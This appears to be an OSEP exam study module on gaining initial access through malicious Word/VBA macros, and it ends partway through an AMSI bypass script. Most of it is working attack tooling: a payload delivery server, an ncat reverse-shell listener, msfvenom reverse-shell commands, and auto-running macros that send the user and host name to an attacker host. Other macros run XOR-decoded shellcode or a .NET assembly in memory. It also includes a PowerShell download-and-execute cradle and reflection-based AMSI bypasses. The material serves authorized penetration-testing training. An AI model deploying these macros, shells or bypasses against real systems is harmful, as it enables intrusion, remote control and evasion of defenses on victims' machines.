::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Word / VBA macro entry

If Office will run a macro, this is usually the fastest initial-access path. Keep stage one short — trigger, fetch, hand off. Name the failure before you rewrite the payload: macro never ran vs macro ran but the next stage was blocked.

## Unknown bitness, AV present

If Office bitness is unknown and AV is present, probe first — delivering a Runner on the wrong arch is a gamble.

- [ ] Start the delivery server and watch the log
- [ ] Generate both shellcodes and start a listener
- [ ] Deliver the harmless callback macro (`m01-callback-ping.vba` → paste into `ThisDocument`, save `.docm`)
- [ ] Deliver the arch probe (`m01-detect-arch.vba`)
- [ ] Embed **only** the matching Runner (never both) and upload

Start the delivery server:

```bash
python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
```

Generate shellcode and listen:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -o sc-x64.c
msfvenom -p windows/shell_reverse_tcp   LHOST=<LHOST> LPORT=<LPORT> -f c -o sc-x86.c
bash m00-listener.sh 4444
```

A `GET /worked` in the delivery log means the macro ran and can talk out. The arch probe returns `64-bit: True/False`.

On callback:

```cmd
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
```

If there is no request in the delivery log, the doc never opened or MotW / macro security blocked it — try a zip, SMB share, legacy `.doc`, or `.xlsm`. If there is a request but no callback, egress is blocked: embed stage two or switch to SMB delivery. If the WMI bitness probe fails, deliver `archbranch` (`#If Win64` at compile time) or check `ProgramFiles(x86)`. If the macro itself is killed, split strings / strip template fingerprints, or switch to HTA / JScript (modules 02 / 03).

::: details `m00-delivery-server.py` · click to expand

````python
#!/usr/bin/env python3
"""Purpose: Delivery server — HTTP/HTTPS dual channel; logs each request's source,
User-Agent, and path to confirm "the target really downloaded"

Scenario: Shared infrastructure (with docs/00-environment-and-infra.md; supports
delivery and triage for scenarios 3, 8, 15, 16, 17, 28, 30, 31)

Dependencies: Python 3.7+ (stdlib); HTTPS needs cert/key (openssl or m00-build-payloads.sh)

Usage:
    # HTTP (default 80)
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS (self-signed)
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # Probe-only: do not return files, only log requests (confirm target egress path)
    python3 m00-delivery-server.py --port 8000 --probe-only

Placeholders: LHOST=attacker IP (script prints usable URLs); PAYLOAD=filename under --dir

Test status: Python 3 syntax checked on macOS (py_compile); HTTP mode can be run locally
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """Static file server with structured logging; probe-only mode logs without returning files."""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # suppress default stderr; unify via _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # Fallback: probe default route egress address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP delivery server (HTTP/HTTPS + request log)")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="Log path; default <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="Log requests only; do not return files")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] Delivery root: {root}")
    print(f"[*] Request log:   {log_path}")
    print(f"[*] Mode:          {'probe-only (log only)' if args.probe_only else 'file delivery'}")
    print("[*] Usable URLs:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C to stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

:::

::: details `m00-listener.sh` · click to expand

````bash
#!/usr/bin/env bash
# Purpose: Standard listener — readline, session logging, port-in-use check,
#          optional auto HTTP delivery
# Scenario: Shared infrastructure (every reverse shell / C2 session; supports docs/00 and all modules)
# Dependencies: ncat or nc, rlwrap (optional), lsof
# Usage: bash m00-listener.sh 4444 [LOGDIR] [--http]
#        Example: bash m00-listener.sh 4444 ~/osep/logs --http
# Placeholders: LPORT=listen port (arg 1), LOGDIR=log directory (arg 2, default ~/osep/logs)
# Test status: bash -n syntax checked (this macOS host has no ncat; listen not lab-tested)
set -euo pipefail

LPORT="${1:-}"
LOGDIR="${2:-$HOME/osep/logs}"
WITH_HTTP=0
[[ "${3:-}" == "--http" || "${2:-}" == "--http" ]] && WITH_HTTP=1

if [[ -z "$LPORT" ]]; then
  echo "Usage: bash $0 LPORT [LOGDIR] [--http]" >&2
  exit 1
fi

mkdir -p "$LOGDIR"
LOGFILE="$LOGDIR/shell-$LPORT.log"

# --- Port-in-use check ---
if command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >/dev/null 2>&1; then
  echo "[!] Port $LPORT is already in use:" >&2
  lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >&2
  echo "[!] Change port or stop the occupying process." >&2
  exit 1
fi

# --- Optional: also start HTTP delivery ---
if [[ "$WITH_HTTP" -eq 1 ]]; then
  if [[ -d "$HOME/osep/payloads" ]]; then
    echo "[*] Starting HTTP delivery (port 80), log: $LOGDIR/http-80.log"
    (cd "$HOME/osep/payloads" && python3 -m http.server 80 >"$LOGDIR/http-80.log" 2>&1 &) || \
      echo "[!] HTTP delivery failed to start (port may be in use); start it separately"
  else
    echo "[!] $HOME/osep/payloads not found; skipping HTTP delivery"
  fi
fi

# --- Choose listener ---
echo "[*] Listening on 0.0.0.0:$LPORT, log: $LOGFILE"
echo "[*] Tip: first commands on a session — whoami /priv, systeminfo, egress probe (see m00-recon-defenses.ps1)"

if command -v rlwrap >/dev/null 2>&1 && command -v ncat >/dev/null 2>&1; then
  rlwrap -cAr ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
elif command -v rlwrap >/dev/null 2>&1; then
  rlwrap -cAr nc -lvnp "$LPORT" 2>&1 | tee -a "$LOGFILE"
elif command -v ncat >/dev/null 2>&1; then
  ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
else
  echo "[!] rlwrap/ncat/nc not found; install: sudo apt install -y ncat rlwrap" >&2
  exit 1
fi
````

:::

::: details `m01-callback-ping.vba` · click to expand

````vb
' Purpose: Harmless callback macro. Confirms the macro actually ran after the
'          victim opens the .docm, BEFORE any malicious payload is delivered.
' Scenario: M01 - Scenario 1 (website accepts .docm, macro triggers, bitness unknown)
' Reference: quick-reference notes "Microsoft Word -> Callback Pinging"
' Dependencies: No payload needed. HTTP server on the Kali side only
'          (see m01-http-file-server.md).
' Usage:
'   1. Start a listener that records HTTP hits, e.g. on Kali:
'        sudo python3 m01-serve.py /var/www/html 80    (or nginx, see infra doc)
'   2. Replace SERVER_URL below with: http://LHOST/m01/callback
'   3. Paste this module into the .docm VBA project (Alt+F11 -> Insert -> Module)
'      and save the document as .docm (Macro-Enabled Document).
' Placeholders: LHOST=<attacker IP reachable from the target>
' Test status: VBA cannot be executed on macOS; XMLHTTP logic verified on
'          Windows PowerShell/IE COM only by hand review. Verify in the lab
'          that the GET shows up in the HTTP server log before delivering real
'          payloads.
Option Explicit

' ===================================================================
' CONFIGURATION
' ===================================================================
' Attacker callback endpoint. Keep it a unique path so the HTTP log makes
' it obvious this document fired (e.g. /m01/callback?u=<user>&t=<epoch>).
Private Const SERVER_URL As String = "http://LHOST/m01/callback"

' -------------------------------------------------------------------
' In-process HTTP GET helper. No child process is spawned, so this also
' works when Office is configured to block PowerShell/cmd child
' processes (Scenario 2 hardening) and avoids the 32-bit-on-64-bit
' System32/SysWOW64 curl.exe lookup problem entirely.
' -------------------------------------------------------------------
Private Function HttpGet(ByVal url As String) As Boolean
    On Error GoTo fail
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False   ' synchronous: macro waits for the request
    http.setRequestHeader "User-Agent", "Mozilla/5.0"  ' blend in with normal traffic
    http.Send
    HttpGet = (http.Status >= 200 And http.Status < 300)
    Set http = Nothing
    Exit Function
fail:
    HttpGet = False
End Function

' -------------------------------------------------------------------
' Callback body: name/process/host info as URL query parameters.
' URL-encode only the characters that can legally break a URL here.
' -------------------------------------------------------------------
Private Function UrlEncode(ByVal s As String) As String
    s = Replace(s, "%", "%25")
    s = Replace(s, " ", "%20")
    s = Replace(s, "&", "%26")
    s = Replace(s, "?", "%3F")
    s = Replace(s, "=", "%3D")
    s = Replace(s, "+", "%2B")
    UrlEncode = s
End Function

Private Sub DoCallback()
    Dim userName As String, hostName As String, tick As String
    Dim fullUrl As String

    ' Collect context WITHOUT relying on WMI or child processes
    On Error Resume Next
    userName = Environ("USERNAME")
    hostName = Environ("COMPUTERNAME")
    On Error GoTo 0

    ' Epoch-ish timestamp to defeat HTTP caching and to see repeat opens
    tick = CStr(CLng(Timer) Mod 100000000)
    fullUrl = SERVER_URL & "?u=" & UrlEncode(userName) & "&h=" & UrlEncode(hostName) & "&t=" & tick

    Dim ok As Boolean
    ok = HttpGet(fullUrl)

    ' Fallback channel #1 (commented by default): classic curl child process.
    ' Only enable when the in-process request is blocked and you accept that
    ' Office may forbid spawning processes on this target.
    ' If Not ok Then
    '     Dim cmd As String
    '     cmd = "cmd.exe /c curl.exe -s -o NUL """ & fullUrl & """"
    '     Shell cmd, vbHide
    ' End If
End Sub

Private Sub RunOnce()
    ' AutoOpen AND Document_Open both fire when Word opens the file, which
    ' would double the callback. Fire the body only once per session.
    Static fired As Boolean
    If Not fired Then
        fired = True
        DoCallback
    End If
End Sub

' Word 2003+ named entry points - keep both, Word may call either one first.
Public Sub AutoOpen()
    RunOnce
End Sub

Public Sub Document_Open()
    RunOnce
End Sub
````

:::

::: details `m01-detect-arch.vba` · click to expand

````vb
' Purpose: Detect Office host bitness and report it (required before delivering a payload)
' Scenario: 1 (probe first when Office bitness is unknown)
' Dependencies: Office + WMI (winmgmts); attacker must run a listener/HTTP log
' Usage: paste into ThisDocument (or a standard module), save as .docm, deliver;
'        attacker first runs `nc -nvlp 80`
' Placeholders: LHOST=attacker IP (replace SERVER_URL below)
' Test status: Not Windows-lab tested; VBA syntax and WMI query hand-reviewed
Option Explicit

Private Const SERVER_URL As String = "http://LHOST:80/arch"   ' ← replace LHOST

Private Sub SendProcessInfo()
    Dim wmiService As Object, processList As Object, processItem As Object
    Dim result As String, is64Bit As Boolean
    Dim procName As String

    procName = "winword.exe"          ' change to excel.exe if delivering via Excel
    On Error Resume Next
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & procName & "'")

    If processList.Count > 0 Then
        For Each processItem In processList
            ' 32-bit Office paths land under Program Files (x86)
            is64Bit = (InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0)
            result = "proc=" & procName & "&x64=" & CStr(is64Bit) & "&user=" & Environ("USERNAME")
        Next
    Else
        result = "proc=" & procName & "&x64=unknown&user=" & Environ("USERNAME")
    End If

    ' Compile-time bitness (bitness of the process hosting VBA — most reliable)
    #If Win64 Then
        result = result & "&vba_x64=True"
    #Else
        result = result & "&vba_x64=False"
    #End If

    If Err.Number <> 0 Then
        result = result & "&err=" & Err.Number
    End If
    On Error GoTo 0

    ' Report (curl ships on Win10+; older systems can switch to nslookup)
    Shell "cmd.exe /c curl -s -X POST -d """ & result & """ " & SERVER_URL, vbHide
End Sub

Sub AutoOpen()
    SendProcessInfo
End Sub

Sub Document_Open()
    SendProcessInfo
End Sub
````

:::

::: details `m01-shellcode-runner-vba-x86.vba` · click to expand

````vb
' Purpose: In-process shellcode Runner under x86 (32-bit) Office
' Scenario: 2, 1 (use after bitness confirmed as 32-bit)
' Dependencies: 32-bit Office; x86 shellcode (msfvenom -p windows/shell_reverse_tcp -f c)
' Usage: replace SHELLCODE and XOR_KEY; paste into ThisDocument; save as .docm
' Placeholders: SHELLCODE (x86 byte array), XOR_KEY (must match encoding)
' Test status: Not Windows-lab tested; declarations and syntax hand-reviewed
Option Explicit

#If Not Win64 Then      ' compile only in 32-bit Office

Private Const XOR_KEY As Byte = &H2A

Private Declare Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As Long, ByVal dwSize As Long, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

Private Declare Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
    ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long

Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)

Private Declare Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long

Sub RunShellcode()
    Dim sc() As Byte, i As Long
    Dim mem As Long, hThread As Long

    sc = GetEncodedShellcode()
    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetEncodedShellcode() As Byte()
    ' ← generate with m13-xor-encoder.py --format vba, then replace
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetEncodedShellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub

#End If
````

:::

::: details `m01-shellcode-runner-vba-x64.vba` · click to expand

````vb
' Purpose: In-process shellcode Runner under x64 Office (no PowerShell/child process)
' Scenario: 2 (alternate when Office blocks launching PowerShell), 1 (x64 branch after bitness confirmed)
' Dependencies: 64-bit Office; x64 shellcode (msfvenom -p windows/x64/... -f c)
' Usage: replace SHELLCODE array with your x64 shellcode (XOR-encode first if desired);
'        paste into ThisDocument; save as .docm
' Placeholders: LHOST/LPORT fixed when shellcode is generated; replace SHELLCODE and XOR_KEY here
' Test status: Not Windows-lab tested; PtrSafe declarations and syntax hand-reviewed
Option Explicit

#If Win64 Then          ' compile this module only in 64-bit Office to avoid bitness-mismatch crashes

Private Const XOR_KEY As Byte = &H2A   ' ← must match the key used when generating shellcode

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long

Sub RunShellcode()
    Dim mem As LongPtr
    Dim hThread As LongPtr

    ' (1) Put your x64 shellcode (XOR-encoded bytes) here
    Dim sc() As Byte
    Dim i As Long
    sc = GetEncodedShellcode()

    ' (2) Decrypt in memory
    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    ' (3) Allocate RWX → copy → executable
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)   ' MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
    If mem = 0 Then
        MsgBox "VirtualAlloc failed (possibly blocked by ASR)"
        Exit Sub
    End If
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    ' (4) Create a thread inside WINWORD.EXE
    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then
        MsgBox "CreateThread failed"
        Exit Sub
    End If
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetEncodedShellcode() As Byte()
    ' ← generate with m13-xor-encoder.py --format vba, then replace this function
    ' Example (placeholder):
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetEncodedShellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub

#End If
````

:::

::: details `m01-shellcode-runner-vba-archbranch.vba` · click to expand

````vb
' Purpose: Use VBA compile-time constants to match Office bitness automatically,
'          avoiding host crashes from delivering a wrong-bitness Runner
' Scenario: 1 ("one-shot" version when bitness is unknown)
' Dependencies: Office; both x64 and x86 shellcode (each XOR-encoded)
' Usage: fill GetX64Shellcode / GetX86Shellcode; paste into ThisDocument; save as .docm
' Placeholders: SHELLCODE_X64, SHELLCODE_X86 (byte arrays), XOR_KEY
' Test status: Not Windows-lab tested; #If Win64 compile-time branch hand-reviewed
'
' Note: VBA's #If Win64 is a **compile-time** constant — when Office loads the macro
'       it already knows whether it is 32 or 64-bit, so one .docm can take the right
'       branch on either Office — more reliable than runtime WMI probing.
Option Explicit

Private Const XOR_KEY As Byte = &H2A

#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
        ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
    Private Declare Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Sub RunShellcode()
    Dim sc() As Byte, i As Long

    #If Win64 Then
        sc = GetX64Shellcode()      ' 64-bit Office → x64 shellcode
    #Else
        sc = GetX86Shellcode()      ' 32-bit Office → x86 shellcode
    #End If

    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    Dim mem As LongPtr, hThread As LongPtr
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetX64Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX64Shellcode = tmp
End Function

Private Function GetX86Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX86Shellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub
````

:::

## Macro runs, Office won’t start PowerShell

If `Shell "powershell ..."` / `WScript.Shell.Run` is blocked, switch to a no-child-process path — stay inside `WINWORD.EXE`.

- [ ] Confirm the macro still runs with the callback macro
- [ ] Deliver the pure VBA Runner (`VirtualAlloc` → `RtlMoveMemory` → `CreateThread`)
- [ ] Keep `powershell` / `cmd` out of the macro body
- [ ] On callback, confirm no new suspicious children

```cmd
wmic process where (ParentProcessId=<WINWORD_PID>) get Name,ProcessId
```

If closing Word kills the session, stabilize first (see below) — don’t start privilege escalation yet.

Fallback: load a .NET assembly from VBA (`m01-embedded-dotnet-runner.vba`).

If VBA Win32 APIs are blocked by ASR, try COM (`MMC20.Application` / `Shell.Application`) or the managed-assembly path. If the macro runs but nothing executes, change host form: HTA (module 02) or JScript (module 03). If Word crashes, bitness mismatch (back to unknown-bitness) or shellcode didn’t decrypt cleanly.

::: details `m01-embedded-dotnet-runner.vba` · click to expand

````vb
' Purpose: Load and run a .NET assembly directly from VBA (no download, no PowerShell child)
' Scenario: 2, 17 (Office blocks child processes; target has no stable egress)
' Dependencies: Office + .NET Framework (mscoree); precompiled managed assembly (Base64-embedded)
' Usage: put assembly Base64 into ASSEMBLY_B64; paste into ThisDocument; save as .docm
' Placeholders: ASSEMBLY_B64 (.NET assembly Base64), ENTRY_TYPE, ENTRY_METHOD
' Test status: Not Windows-lab tested; COM/reflection call style hand-reviewed
'
' Note: load the CLR via mscoree's CorBindToRuntimeEx, then reflect into the assembly entry.
'       Prefer compiling the assembly with csc.exe as a Library with public static void Run().
Option Explicit

Private Const ASSEMBLY_B64 As String = "REPLACE_WITH_BASE64_ASSEMBLY"
Private Const ENTRY_TYPE As String = "Payload.Runner"
Private Const ENTRY_METHOD As String = "Run"

Private Sub LoadManaged()
    Dim clr As Object, appDomain As Object, asm As Object
    Dim bytes() As Byte, entryType As Object, mi As Object

    On Error Resume Next
    ' (1) Get CLR (.NET 4.0)
    Set clr = CreateObject("Clr4.mscoree")          ' some envs use an "mscoree.dll" COM wrapper
    If clr Is Nothing Then
        ' Alternate: VBScript-style GetObject to trigger the CLR host
        Set clr = GetObject("new:{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}")   ' CorRuntimeHost
    End If

    ' (2) Create AppDomain and load assembly bytes (in-memory; no disk)
    bytes = Base64Decode(ASSEMBLY_B64)
    Set appDomain = clr.GetDefaultDomain()
    Set asm = appDomain.Load(bytes)

    ' (3) Reflect into the entry
    Set entryType = asm.GetType(ENTRY_TYPE)
    If Not entryType Is Nothing Then
        Set mi = entryType.GetMethod(ENTRY_METHOD)
        If Not mi Is Nothing Then mi.Invoke Null, Array()
    End If
    On Error GoTo 0
End Sub

' Minimal Base64 decode (avoid depending on external components)
Private Function Base64Decode(ByVal s As String) As Byte()
    Dim xml As Object, node As Object
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b")
    node.dataType = "bin.base64"
    node.Text = s
    Base64Decode = node.nodeTypedValue
End Function

Sub AutoOpen()
    LoadManaged
End Sub

Sub Document_Open()
    LoadManaged
End Sub
````

:::

## PowerShell starts, stage-two blocked by AMSI

If the macro launches PowerShell and the delivery log shows stage2 being fetched, but the script content is blocked, fix AMSI before changing the whole chain.

Short macro launches PowerShell:

```vb
Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<stage2.ps1>')"
```

- [ ] Prove the path end-to-end with a **harmless** stage2 first
- [ ] Swap in the real stage2; on block, prepend an AMSI handler (`m05-amsi-bypass-variants.ps1`, variants 1→4, one at a time)
- [ ] Still blocked → split “AMSI handler” and “real payload” into two files; handle first, then fetch
- [ ] Still blocked → drop PowerShell; use the managed-assembly path below, or HTA / JScript

If the AMSI handler itself is blocked, string-concat / encode it, or reflectively load .NET and skip the script path. If every variant fails, changing host form is usually faster than grinding AMSI. If the download is blocked but the script isn’t, it’s network / proxy — see [egress channels](/modules/09-c2-egress-channels).

::: details `m05-amsi-bypass-variants.ps1` · click to expand

````powershell
<#
Purpose: Multiple experimental AMSI-handling versions; pick the implementation that
      matches the host (PowerShell / WSH / .NET)
Scenario: 3, 7, 10, 18, 19 (and as a prerequisite for PowerShell paths across M05)
Dependencies: PowerShell 3.0+; some versions need reflection rights (fails under CLM;
      see m05-clm-bypass-runspace.ps1)
Usage: powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      or in an existing session: . .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
Placeholders: none (local-only; no LHOST/LPORT)
Test status: Not Windows-lab tested; syntax hand-checked. Before the exam, validate
      each version in the lab environment
Notes:
  - AMSI handling changes with patches; one version failing does not mean the technique
    is dead — try the next version.
  - Probe first to see whether AMSI is active, then decide whether to handle it.
  - PowerShell host → PS versions; WSH (.js/.vbs) needs WSH-specific versions — do not copy blindly.
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    Harmless probe: contains strings AMSI commonly scans. If blocked, AMSI is active.
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] Probe strings: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] Probe not blocked (AMSI may be inactive or already handled)"
        return $false
    } catch {
        Write-Output ("[!] Probe blocked: {0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] Applying AMSI handling version {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # Version 1: reflectively set amsiInitFailed (classic; often blocked, but try first)
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] Version 1 done"
            } catch { Write-Output ("[-] Version 1 failed: {0}" -f $_.Exception.Message) }
        }
        2 {
            # Version 2: string concatenation to dodge static signatures
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] Version 2 done"
            } catch { Write-Output ("[-] Version 2 failed: {0}" -f $_.Exception.Message) }
        }
        3 {
            # Version 3: break amsiContext (reflectively null the context)
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] Version 3 done"
            } catch { Write-Output ("[-] Version 3 failed: {0}" -f $_.Exception.Message) }
        }
        4 {
